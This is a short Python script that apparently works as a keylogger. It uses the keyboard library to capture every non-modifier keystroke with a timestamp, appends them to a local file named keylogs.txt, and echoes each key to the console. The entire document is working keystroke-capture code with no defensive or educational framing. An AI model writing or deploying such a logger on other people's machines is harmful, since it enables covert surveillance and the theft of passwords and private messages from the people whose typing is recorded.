import sys
import time
from datetime import datetime
import keyboard

def log_keys():
    try:
        with open("keylogs.txt", "a") as f:
            while True:
                event = keyboard.read_event()
                if event.name not in keyboard.all_modifiers:
                    f.write(str(datetime.now()) + ": " + str(event.name) + "\n")
                    print("Logged: ", event.name)
    except Exception as e:
        print("Error occurred:", e, file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    log_keys()